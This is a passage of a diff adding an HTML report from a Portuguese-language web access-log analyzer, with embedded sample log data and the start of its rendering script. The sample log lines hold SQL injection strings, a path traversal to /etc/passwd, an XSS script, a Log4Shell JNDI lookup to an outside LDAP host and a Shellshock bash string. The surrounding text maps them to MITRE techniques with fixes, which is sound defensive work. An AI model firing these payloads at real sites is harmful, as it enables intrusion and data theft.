maliciosa\nde 203.0.113.200"}],"target":{"title":"Site / API","tag":"HTTP","sub":"63 requisições","rows":[{"label":"Respostas","chips":["404 × 29","200 × 24","500 × 5","302 × 3","400 × 1","403 × 1"]},{"label":"Arquivos expostos","items":[{"text":"/.env para 198.51.100.23","line":19}]},{"label":"Logins após brute force","items":[{"text":"/wp-login.php por 203.0.113.50","line":34}]},{"label":"Mais procurados (404)","chips":["/.git/config","/backup.sql","/wp-config.php.bak","/phpinfo.php","/admin","/backup","/old","/test"]}]},"techniques":[{"id":"T1595.002","name":"Varredura de vulnerabilidades","description":"Ferramenta automática procurando falhas conhecidas.","ips":["198.51.100.23","203.0.113.50","203.0.113.9","198.51.100.77"],"evidence":[8,9,10,18,19,20,26,27]},{"id":"T1595.003","name":"Varredura por lista de palavras","description":"Muitos caminhos testados a partir de uma lista pronta.","ips":["198.51.100.23","198.51.100.77"],"evidence":[18,19,20,21,22,36,37,38]},{"id":"T1190","name":"Exploração de aplicação pública","description":"Payloads de SQL injection, XSS, path traversal ou execução de comando.","ips":["198.51.100.23","203.0.113.9","203.0.113.200"],"evidence":[8,9,10,11,12,13,14,15]},{"id":"T1110.001","name":"Adivinhação de senha","description":"Muitas senhas contra a mesma conta.","ips":["203.0.113.50"],"evidence":[26,27,28,29,30,31,32,33]},{"id":"T1078","name":"Uso de conta válida","description":"Login aceito depois de várias senhas erradas: senha descoberta.","ips":["203.0.113.50"],"evidence":[34]},{"id":"T1552.001","name":"Credenciais em arquivos","description":"Um arquivo com segredos (.env, backup) foi baixado.","ips":["198.51.100.23"],"evidence":[19]}],"findings":[{"type":"web_sensitive_exposed","title":"Arquivo sensível exposto","severity":"critico","why":"O servidor respondeu 200 para um arquivo como .env ou .git: segredos podem ter vazado.","steps":["Tire o arquivo da pasta pública agora.","Considere vazados todos os segredos dele: troque senhas do banco, chaves de API e tokens.","Bloqueie arquivos ocultos e de backup no servidor web.","Confira no log quem mais baixou o arquivo."],"commands":["# nginx: dentro do bloco server","location ~ /\\.(?!well-known) { deny all; }","location ~* \\.(bak|old|sql|swp|zip|tar\\.gz)$ { deny all; }","curl -I https://seu-site/.env     # precisa responder 403 ou 404"],"ips":["198.51.100.23"],"count":1,"evidence":[19]},{"type":"web_login_compromise","title":"Login aceito depois de brute force no site","severity":"critico","why":"A conta foi acessada depois de várias senhas erradas: provável senha descoberta.","steps":["Troque a senha da conta e encerre todas as sessões abertas.","Ative 2FA para os usuários, começando pelos administradores.","Revise o que a conta fez depois do login."],"commands":[],"ips":["203.0.113.50"],"count":1,"evidence":[34]},{"type":"web_sqli","title":"Tentativa de SQL injection","severity":"alto","why":"Se a consulta for montada com texto do usuário, o atacante lê ou apaga o banco.","steps":["Use consultas parametrizadas (ou um ORM) em todo acesso ao banco.","Dê ao usuário do banco só as permissões que a aplicação precisa.","Um WAF (ModSecurity + OWASP CRS) ajuda como camada extra, não como correção.","Respostas 200 com tamanho fora do normal podem indicar vazamento: confira."],"commands":["cur.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))   # certo","cur.execute(f\"SELECT * FROM users WHERE id = {user_id}\")       # vulnerável"],"ips":["203.0.113.9"],"count":10,"evidence":[8,9,10,11,12,13,14,15]},{"type":"web_login_bruteforce","title":"Brute force no login do site","severity":"alto","why":"Muitas senhas erradas seguidas no formulário de login.","steps":["Limite tentativas por conta e por IP, com bloqueio temporário.","Ofereça 2FA e incentive senhas longas.","No WordPress, desative o xmlrpc.php se não usa.","fail2ban também funciona com o log do nginx."],"commands":["# nginx: até 5 tentativas por minuto por IP no login","limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;","location = /wp-login.php { limit_req zone=login burst=5; ... }"],"ips":["203.0.113.50"],"count":8,"evidence":[26,27,28,29,30,31,32,33]},{"type":"web_rce","title":"Tentativa de execução de comandos (RCE)","severity":"alto","why":"O atacante tenta rodar comandos no servidor (injeção de comando, Log4Shell, Shellshock).","steps":["Nunca passe entrada do usuário para o shell; use listas de argumentos sem shell=True.","Atualize bibliotecas e o servidor (Log4j 2.17.1+, bash corrigido).","Rode a aplicação com um usuário sem privilégios e sem saída livre para a internet.","Se alguma dessas requisições teve resposta 200, investigue o servidor."],"commands":["subprocess.run([\"ping\", \"-c\", \"1\", host])   # e não os.system(f\"ping {host}\")"],"ips":["203.0.113.200"],"count":2,"evidence":[61,62]},{"type":"web_traversal","title":"Tentativa de path traversal (../)","severity":"alto","why":"O atacante tenta ler arquivos fora da pasta do site, como /etc/passwd.","steps":["Não monte caminhos de arquivo com texto do usuário; use uma lista de arquivos permitidos.","Se precisar, normalize o caminho e confira que ele continua dentro da pasta permitida.","Rode a aplicação com um usuário que não consegue ler arquivos do sistema."],"commands":["path = (BASE / nome).resolve()","if not path.is_relative_to(BASE): abort(404)"],"ips":["198.51.100.23"],"count":1,"evidence":[23]},{"type":"web_xss","title":"Tentativa de XSS","severity":"medio","why":"Se a página devolver o texto sem escapar, o script roda no navegador das vítimas.","steps":["Escape toda saída (templates com autoescape, como Jinja2 e React, já fazem isso).","Adicione um Content-Security-Policy que bloqueie scripts inline.","Marque os cookies de sessão como HttpOnly."],"commands":["Content-Security-Policy: default-src 'self'; script-src 'self'"],"ips":["198.51.100.23"],"count":1,"evidence":[24]},{"type":"web_scanning","title":"Varredura do site","severity":"baixo","why":"Muitos 404 seguidos ou ferramenta de varredura: o atacante mapeia o site.","steps":["Mantenha o site, plugins e o servidor web atualizados.","Remova páginas de exemplo, painéis e instaladores que não usa.","O filtro nginx-botsearch do fail2ban bloqueia quem gera muitos 404."],"commands":[],"ips":["198.51.100.23","203.0.113.50","203.0.113.9","198.51.100.77"],"count":53,"evidence":[8,9,10,18,19,20,26,27]}],"critical_lines":[19,34],"labels":{"failed":"Ataques","accepted":"Com 2xx","users":"Caminhos","failed_unit":["ataque","ataques"],"accepted_unit":["com 2xx","com 2xx"],"target_sub":"O que foi atacado neste site.","accounts_title":"Caminhos mais atacados","accounts_sub":"Requisições maliciosas por caminho.","accounts_empty":"Nenhuma requisição maliciosa.","seq_intro":"Cada quadrado é uma requisição suspeita, na ordem do log. Resposta 2xx a um ataque merece atenção; um arquivo sensível baixado ou um login depois de brute force é crítico.","legend":[["failed","Ataque bloqueado ou senha errada"],["warn","Ataque com resposta 2xx"],["crit","Ataque com sucesso (crítico)"],["accepted","Login aceito"],["recon","404 (sondagem)"]],"limit":"Limite de 5 senhas erradas seguidas"},"log_filters":[["all","Todas",[]],["attack","Ataques",["attack","attack_ok"]],["login","Logins",["login_fail","login_ok"]],["recon","404",["recon"]]],"kind_labels":{"attack":"ATAQUE","attack_ok":"ATAQUE 2XX","login_fail":"LOGIN ✕","login_ok":"LOGIN ✓","recon":"404"},"lines":[[1,"normal","192.0.2.44 - - [27/Nov/2026:09:00:04 -0300] \"GET / HTTP/1.1\" 200 5120 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36\"","192.0.2.44"],[2,"normal","192.0.2.44 - - [27/Nov/2026:09:00:08 -0300] \"GET /static/app.css HTTP/1.1\" 200 880 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36\"","192.0.2.44"],[3,"normal","192.0.2.44 - - [27/Nov/2026:09:00:12 -0300] \"GET /produtos HTTP/1.1\" 200 7300 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36\"","192.0.2.44"],[4,"normal","192.0.2.44 - - [27/Nov/2026:09:00:16 -0300] \"GET /produto.php?id=7 HTTP/1.1\" 200 4100 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36\"","192.0.2.44"],[5,"normal","192.0.2.44 - - [27/Nov/2026:09:00:20 -0300] \"GET /login HTTP/1.1\" 200 2100 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36\"","192.0.2.44"],[6,"login_ok","192.0.2.44 - - [27/Nov/2026:09:00:29 -0300] \"POST /login HTTP/1.1\" 302 0 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36\"","192.0.2.44"],[7,"normal","192.0.2.44 - - [27/Nov/2026:09:00:30 -0300] \"GET /minha-conta HTTP/1.1\" 200 3900 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36\"","192.0.2.44"],[8,"attack","203.0.113.9 - - [27/Nov/2026:09:20:30 -0300] \"GET /produto.php?id=1%27 HTTP/1.1\" 500 312 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"","203.0.113.9"],[9,"attack_ok","203.0.113.9 - - [27/Nov/2026:09:20:30 -0300] \"GET /produto.php?id=1%20AND%201%3D1 HTTP/1.1\" 200 4100 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"","203.0.113.9"],[10,"attack","203.0.113.9 - - [27/Nov/2026:09:20:31 -0300] \"GET /produto.php?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1\" 500 312 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"","203.0.113.9"],[11,"attack_ok","203.0.113.9 - - [27/Nov/2026:09:20:31 -0300] \"GET /produto.php?id=1%27%20OR%201%3D1--%20- HTTP/1.1\" 200 4100 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"","203.0.113.9"],[12,"attack","203.0.113.9 - - [27/Nov/2026:09:20:32 -0300] \"GET /produto.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20- HTTP/1.1\" 500 312 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"","203.0.113.9"],[13,"attack_ok","203.0.113.9 - - [27/Nov/2026:09:20:32 -0300] \"GET /produto.php?id=1%20UNION%20SELECT%20username%2Cpassword%2CNULL%20FROM%20users--%20- HTTP/1.1\" 200 4100 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"","203.0.113.9"],[14,"attack","203.0.113.9 - - [27/Nov/2026:09:20:32 -0300] \"GET /produto.php?id=1%20AND%20SLEEP%285%29 HTTP/1.1\" 500 312 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"","203.0.113.9"],[15,"attack_ok","203.0.113.9 - - [27/Nov/2026:09:20:33 -0300] \"GET /produto.php?id=1%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1\" 200 4100 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"","203.0.113.9"],[16,"attack","203.0.113.9 - - [27/Nov/2026:09:20:33 -0300] \"GET /produto.php?id=1%20AND%20%28SELECT%201%20FROM%20information_schema.tables%20LIMIT%201%29%3D1 HTTP/1.1\" 500 312 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"","203.0.113.9"],[17,"attack_ok","203.0.113.9 - - [27/Nov/2026:09:20:34 -0300] \"GET /produto.php?id=1%27%3B%20DROP%20TABLE%20users-- HTTP/1.1\" 200 4100 \"-\" \"sqlmap/1.8.11#stable (https://sqlmap.org)\"","203.0.113.9"],[18,"attack","198.51.100.23 - - [27/Nov/2026:09:35:34 -0300] \"GET /.git/config HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007500)\"","198.51.100.23"],[19,"attack_ok","198.51.100.23 - - [27/Nov/2026:09:35:34 -0300] \"GET /.env HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007500)\"","198.51.100.23"],[20,"attack","198.51.100.23 - - [27/Nov/2026:09:35:34 -0300] \"GET /backup.sql HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007500)\"","198.51.100.23"],[21,"attack","198.51.100.23 - - [27/Nov/2026:09:35:35 -0300] \"GET /wp-config.php.bak HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007500)\"","198.51.100.23"],[22,"attack","198.51.100.23 - - [27/Nov/2026:09:35:35 -0300] \"GET /phpinfo.php HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007500)\"","198.51.100.23"],[23,"attack","198.51.100.23 - - [27/Nov/2026:09:35:35 -0300] \"GET /download.php?file=../../../../etc/passwd HTTP/1.1\" 400 157 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007500)\"","198.51.100.23"],[24,"attack_ok","198.51.100.23 - - [27/Nov/2026:09:35:36 -0300] \"GET /busca?q=%3Cscript%3Ealert%281%29%3C/script%3E HTTP/1.1\" 200 3300 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007500)\"","198.51.100.23"],[25,"attack","198.51.100.23 - - [27/Nov/2026:09:35:36 -0300] \"GET /server-status HTTP/1.1\" 403 199 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007500)\"","198.51.100.23"],[26,"login_fail","203.0.113.50 - - [27/Nov/2026:10:05:37 -0300] \"POST /wp-login.php HTTP/1.1\" 200 4500 \"-\" \"Mozilla/5.0 (Hydra)\"","203.0.113.50"],[27,"login_fail","203.0.113.50 - - [27/Nov/2026:10:05:38 -0300] \"POST /wp-login.php HTTP/1.1\" 200 4500 \"-\" \"Mozilla/5.0 (Hydra)\"","203.0.113.50"],[28,"login_fail","203.0.113.50 - - [27/Nov/2026:10:05:38 -0300] \"POST /wp-login.php HTTP/1.1\" 200 4500 \"-\" \"Mozilla/5.0 (Hydra)\"","203.0.113.50"],[29,"login_fail","203.0.113.50 - - [27/Nov/2026:10:05:39 -0300] \"POST /wp-login.php HTTP/1.1\" 200 4500 \"-\" \"Mozilla/5.0 (Hydra)\"","203.0.113.50"],[30,"login_fail","203.0.113.50 - - [27/Nov/2026:10:05:40 -0300] \"POST /wp-login.php HTTP/1.1\" 200 4500 \"-\" \"Mozilla/5.0 (Hydra)\"","203.0.113.50"],[31,"login_fail","203.0.113.50 - - [27/Nov/2026:10:05:41 -0300] \"POST /wp-login.php HTTP/1.1\" 200 4500 \"-\" \"Mozilla/5.0 (Hydra)\"","203.0.113.50"],[32,"login_fail","203.0.113.50 - - [27/Nov/2026:10:05:42 -0300] \"POST /wp-login.php HTTP/1.1\" 200 4500 \"-\" \"Mozilla/5.0 (Hydra)\"","203.0.113.50"],[33,"login_fail","203.0.113.50 - - [27/Nov/2026:10:05:42 -0300] \"POST /wp-login.php HTTP/1.1\" 200 4500 \"-\" \"Mozilla/5.0 (Hydra)\"","203.0.113.50"],[34,"login_ok","203.0.113.50 - - [27/Nov/2026:10:05:43 -0300] \"POST /wp-login.php HTTP/1.1\" 302 0 \"-\" \"Mozilla/5.0 (Hydra)\"","203.0.113.50"],[35,"normal","203.0.113.50 - - [27/Nov/2026:10:05:44 -0300] \"GET /wp-admin/ HTTP/1.1\" 200 52000 \"-\" \"Mozilla/5.0 (Hydra)\"","203.0.113.50"],[36,"recon","198.51.100.77 - - [27/Nov/2026:10:15:44 -0300] \"GET /admin HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[37,"recon","198.51.100.77 - - [27/Nov/2026:10:15:44 -0300] \"GET /backup HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[38,"recon","198.51.100.77 - - [27/Nov/2026:10:15:44 -0300] \"GET /old HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[39,"recon","198.51.100.77 - - [27/Nov/2026:10:15:45 -0300] \"GET /test HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[40,"recon","198.51.100.77 - - [27/Nov/2026:10:15:45 -0300] \"GET /dev HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[41,"normal","198.51.100.77 - - [27/Nov/2026:10:15:45 -0300] \"GET /api HTTP/1.1\" 302 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[42,"recon","198.51.100.77 - - [27/Nov/2026:10:15:45 -0300] \"GET /uploads HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[43,"recon","198.51.100.77 - - [27/Nov/2026:10:15:45 -0300] \"GET /private HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[44,"recon","198.51.100.77 - - [27/Nov/2026:10:15:45 -0300] \"GET /tmp HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[45,"recon","198.51.100.77 - - [27/Nov/2026:10:15:45 -0300] \"GET /logs HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[46,"recon","198.51.100.77 - - [27/Nov/2026:10:15:45 -0300] \"GET /config HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[47,"recon","198.51.100.77 - - [27/Nov/2026:10:15:45 -0300] \"GET /db HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[48,"recon","198.51.100.77 - - [27/Nov/2026:10:15:45 -0300] \"GET /phpmyadmin HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[49,"recon","198.51.100.77 - - [27/Nov/2026:10:15:46 -0300] \"GET /cpanel HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[50,"recon","198.51.100.77 - - [27/Nov/2026:10:15:46 -0300] \"GET /manager HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[51,"recon","198.51.100.77 - - [27/Nov/2026:10:15:46 -0300] \"GET /console HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[52,"recon","198.51.100.77 - - [27/Nov/2026:10:15:46 -0300] \"GET /staging HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[53,"recon","198.51.100.77 - - [27/Nov/2026:10:15:46 -0300] \"GET /beta HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[54,"recon","198.51.100.77 - - [27/Nov/2026:10:15:46 -0300] \"GET /v1 HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[55,"recon","198.51.100.77 - - [27/Nov/2026:10:15:46 -0300] \"GET /v2 HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[56,"recon","198.51.100.77 - - [27/Nov/2026:10:15:46 -0300] \"GET /includes HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[57,"recon","198.51.100.77 - - [27/Nov/2026:10:15:46 -0300] \"GET /secret HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[58,"recon","198.51.100.77 - - [27/Nov/2026:10:15:46 -0300] \"GET /dump HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[59,"recon","198.51.100.77 - - [27/Nov/2026:10:15:47 -0300] \"GET /panel HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[60,"recon","198.51.100.77 - - [27/Nov/2026:10:15:47 -0300] \"GET /dashboard HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"","198.51.100.77"],[61,"attack_ok","203.0.113.200 - - [27/Nov/2026:10:55:48 -0300] \"GET / HTTP/1.1\" 200 5120 \"-\" \"${jndi:ldap://198.51.100.99:1389/a}\"","203.0.113.200"],[62,"attack","203.0.113.200 - - [27/Nov/2026:10:55:49 -0300] \"GET /cgi-bin/status HTTP/1.1\" 404 162 \"-\" \"() { :; }; /bin/bash -c 'id'\"","203.0.113.200"],[63,"normal","192.0.2.44 - - [27/Nov/2026:11:00:50 -0300] \"GET /produtos HTTP/1.1\" 200 7300 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36\"","192.0.2.44"]],"lines_note":null,"source":"sample_access.log","generated":"27/11/2026 08:15","threshold":5,"meta":["sample_access.log","27/11/2026 09:00:04 → 27/11/2026 11:00:50","gerado em 27/11/2026 08:15"]}</script>
+<script>
+(() => {
+  "use strict";
+  const D = JSON.parse(document.getElementById("data").textContent);
+  const L = D.labels;
+  const $ = (sel) => document.querySelector(sel);
+  const nf = new Intl.NumberFormat("pt-BR", { maximumFractionDigits: 1 });
+
+  // Cria elementos sem innerHTML: todo texto do log entra como texto, nunca como HTML.
+  function h(tag, attrs, ...children) {
+    const el = document.createElement(tag);
+    for (const [k, v] of Object.entries(attrs || {})) {
+      if (v == null || v === false) continue;
+      if (k === "class") el.className = v;
+      else if (k === "style") el.style.cssText = v;          // CSSOM: permitido pela CSP
+      else if (k.startsWith("on")) el.addEventListener(k.slice(2), v);
+      else el.setAttribute(k, v === true ? "" : v);
+    }
+    for (const c of children.flat(Infinity)) {
+      if (c == null || c === false) continue;
+      el.append(c instanceof Node ? c : document.createTextNode(String(c)));
+    }
+    return el;
+  }
+
+  const RISK = { critico: "Crítico", alto: "Alto", medio: "Médio", baixo: "Baixo" };
+  const GLYPH = { failed: "✕", accepted: "✓", warn: "!", recon: "?", crit: "!" };
+  const MITRE_URL = (id) => "https://attack.mitre.org/techniques/" + id.replace(".", "/") + "/";
+  const byIp = Object.fromEntries(D.attackers.map((a) => [a.ip, a]));
+  const critLines = new Set(D.critical_lines);
+  const plural = (n, one, many) => nf.format(n) + " " + (n === 1 ? one : many);
+
+  const badge = (risk, text) => h("span", { class: "badge " + risk }, text || RISK[risk]);
+  const ipButton = (ip) =>
+    h("button", { class: "ip-link", type: "button", onclick: (e) => { e.stopPropagation(); showIp(ip); } }, ip);
+  const lineLink = (n) =>
+    h("button", { class: "line-link", type: "button", "data-tip": "Ir para a linha " + n, onclick: () => jumpTo(n) }, "L" + n);
+
+  // ---------- Cabeçalho ----------
+  if (D.nav) {
+    $("#nav").append(h("a", { class: "back", href: D.nav.href }, "← " + D.nav.label));
+    $("#eyebrow").textContent = D.nav.title || "Analisador de logs";
+  } else {
+    $("#eyebrow").textContent = D.kind === "web" ? "Analisador de logs web" : "Analisador de logs SSH";
+  }
+  $("#meta").append(...D.meta.map((m, i) => h("span", null, i === 0 ? h("span", { class: "mono" }, m) : m)));
+
+  // ---------- Veredito ----------
+  const V = D.verdict;
+  const verdict = $("#verdict");
+  verdict.classList.add(V.level);
+  verdict.append(
+    badge(V.level),
+    h("h2", null, V.title),
+    h("p", null, V.text),
+    V.actions.length ? h("div", { class: "actions" }, V.actions.map((a) =>
+      h("button", { type: "button", onclick: () => (a.line ? jumpTo(a.line) : showIp(a.ip)) }, a.label))) : null
+  );
+
+  // ---------- KPIs ----------
+  $("#kpis").append(...D.kpis.map((k) =>
+    h("div", { class: "kpi" },
+      h("div", { class: "label" }, k.label),
+      h("div", { class: "value" }, nf.format(k.value)),
+      h("div", { class: "note" }, k.note))));
+
+  // ---------- Origem ----------
+  const pace = (a) => {
+    if (a.median_gap == null) return h("span", { class: "muted" }, "—");
+    return h("span", null, nf.format(a.median_gap) + " s",
+      h("div", { class: "why" }, a.machine_pace ? "ritmo de máquina" : "ritmo humano"));
+  };
+  const usersCell = (a) => {
+    if (!a.users.length) return h("span", { class: "muted" }, "—");
+    const shown = a.users.slice(0, 3).join(", ") + (a.users.length > 3 ? " +" + (a.users.length - 3) : "");
+    return h("span", null, nf.format(a.users.length), h("div", { class: "why mono" }, shown));
+  };
+  $("#attackers").append(
+    h("thead", null, h("tr", null,
+      h("th", null, "IP"), h("th", null, "Risco"), h("th", { class: "num" }, L.failed),
+      h("th", { class: "num" }, L.accepted), h("th", null, L.users), h("th", null, "Ferramenta provável"),
+      h("th", null, "Intervalo"), h("th", null, "Atividade"))),
+    h("tbody", null, D.attackers.map((a) =>
+      h("tr", { onclick: () => showIp(a.ip) },
+        h("td", null, ipButton(a.ip)),
+        h("td", null, badge(a.risk)),
+        h("td", { class: "num" }, nf.format(a.failed)),
+        h("td", { class: "num" }, a.accepted ? h("strong", null, nf.format(a.accepted)) : "0"),
+        h("td", null, usersCell(a)),
+        h("td", null, a.tool, h("div", { class: "why" }, a.tool_basis)),
+        h("td", null, pace(a)),
+        h("td", { class: "mono" }, a.period)
+      )))
+  );
+
+  // ---------- Alvo ----------
+  const T = D.target;
+  $("#target-sub").textContent = L.target_sub;
+  $("#target").append(
+    h("div", { class: "target-host" },
+      h("span", { class: "big" }, T.title),
+      h("span", { class: "tag" }, T.tag),
+      h("span", { class: "sub" }, T.sub)),
+    h("dl", { class: "kv" }, T.rows.flatMap((r) => {
+      let value;
+      if (r.chips) value = r.chips.length ? h("div", { class: "chips" }, r.chips.map((c) => h("span", { class: "tag mono" }, c))) : h("span", { class: "muted" }, "—");
+      else if (r.items) value = r.items.length ? r.items.map((it) => h("div", null, it.text + " ", lineLink(it.line))) : h("span", { class: "muted" }, "nenhum");
+      else value = h("span", { class: r.muted ? "muted" : null }, r.text);
+      return [h("dt", null, r.label), h("dd", null, value, r.note ? h("div", { class: "why" }, r.note) : null)];
+    }))
+  );
+
+  // ---------- Contas / caminhos ----------
+  $("#accounts-title").textContent = L.accounts_title;
+  $("#accounts-sub").textContent = L.accounts_sub;
+  const top = D.accounts.slice(0, 10);
+  const maxCount = Math.max(1, ...top.map((x) => x.count));
+  $("#accounts").append(...(top.length ? top.map((x) =>
+    h("div", { class: "bar-row", "data-tip": x.tip },
+      h("span", { class: "name" }, x.name),
+      h("div", { class: "bar-track" }, h("div", { class: "bar", style: "width:" + (100 * x.count) / maxCount + "%" })),
+      h("span", { class: "val" }, nf.format(x.count)),
+      h("div", { class: "flags" }, x.flags.map((f) => f.critical ? badge("critico", f.text) : h("span", { class: "tag" }, f.text)))
+    )) : [h("p", { class: "muted" }, L.accounts_empty)]));
+
+  // ---------- Como corrigir ----------
+  function copyButton(text) {
+    const btn = h("button", { type: "button" }, "Copiar");
+    btn.addEventListener("click", async () => {
+      try { await navigator.clipboard.writeText(text); btn.textContent = "Copiado"; }
+      catch (_) { btn.textContent = "Selecione e copie"; }
+      setTimeout(() => { btn.textContent = "Copiar"; }, 1600);
+    });
+    return btn;
+  }
+  if (!D.findings.length) {
+    $("#fixes").append(h("p", { class: "muted" }, "Nada para corrigir: nenhum ataque encontrado neste log."));
+  }
+  $("#fixes").append(...D.findings.map((f) => {
+    const code = f.commands.join("\n");
+    return h("div", { class: "fix" },
+      h("div", { class: "item-head" }, badge(f.severity), h("strong", null, f.title),
+        h("span", { class: "muted" }, plural(f.count, "ocorrência", "ocorrências"))),
+      h("p", { class: "sub", style: "margin-top:4px" }, f.why),
+      h("ol", null, f.steps.map((s) => h("li", null, s))),
+      code ? h("div", { class: "code" }, h("pre", null, code), copyButton(code)) : null,
+      h("div", { class: "evidence" }, "IPs:", ...f.ips.slice(0, 6).map(ipButton),
+        f.ips.length > 6 ? " +" + (f.ips.length - 6) : null),
+      f.evidence.length ? h("div", { class: "evidence" }, "Evidência:", ...f.evidence.map(lineLink)) : null
+    );
+  }));
+
+  // ---------- Ferramentas ----------
+  const tools = {};
+  for (const a of D.attackers) (tools[a.tool] = tools[a.tool] || []).push(a);
+  $("#tools").append(...Object.entries(tools).map(([tool, list]) =>
+    h("div", { class: "item" },
+      h("div", { class: "item-head" }, h("strong", null, tool), ...[...new Set(list.map((a) => a.risk))].map((r) => badge(r))),
+      h("p", null, list[0].tool_basis),
+      h("div", { class: "evidence" }, "IPs:", ...list.slice(0, 8).map((a) => ipButton(a.ip)),
+        list.length > 8 ? " +" + (list.length - 8) : null,
+        ...list.filter((a) => a.software).slice(0, 3).map((a) => lineLink(a.software.n)))
+    )));
+
+  // ---------- Técnicas ----------
+  $("#techniques").append(...(D.techniques.length ? D.techniques.map((t) =>
+    h("div", { class: "item" },
+      h("div", { class: "item-head" },
+        h("a", { class: "mitre", href: MITRE_URL(t.id), target: "_blank", rel: "noopener noreferrer" }, t.id),
+        h("strong", null, t.name)),
+      h("p", null, t.description),
+      h("div", { class: "evidence" }, "IPs:", ...t.ips.slice(0, 8).map(ipButton)),
+      h("div", { class: "evidence" }, "Evidência:", ...t.evidence.map(lineLink))
+    )) : [h("p", { class: "muted item" }, "Nenhuma técnica de ataque identificada.")]));
+
+  // ---------- Sequências ----------
+  $("#seq-intro").textContent = L.seq_intro;
+  $("#seq-legend").append(
+    ...L.legend.map(([cls, label]) => h("span", null, h("span", { class: "chip static " + cls, "aria-hidden": "true" }, GLYPH[cls]), label)),
+    h("span", null, h("span", { class: "limit", "aria-hidden": "true", style: "height:20px" }), L.limit)
+  );
+  const MAX_CHIPS = 150;
+  const withSeq = D.attackers.filter((a) => a.sequence.length);
+  $("#sequences").append(...(withSeq.length ? withSeq.map((a) => {
+    const chips = [];
+    for (const s of a.sequence.slice(0, MAX_CHIPS)) {
+      const cls = s.crit ? "crit" : s.k;
+      chips.push(h("button", {
+        class: "chip " + cls, type: "button",
+        "aria-label": s.label + ", linha " + s.n,
+        "data-tip": s.label + "\n" + s.time + " · linha " + s.n,
+        onclick: () => jumpTo(s.n),
+      }, GLYPH[cls]));
+      if (s.count === D.threshold) {
+        chips.push(h("span", { class: "limit", "data-tip": L.limit + " atingido" }, h("span", null, "limite")));
+      }
+    }
+    const extra = a.sequence.length - MAX_CHIPS;
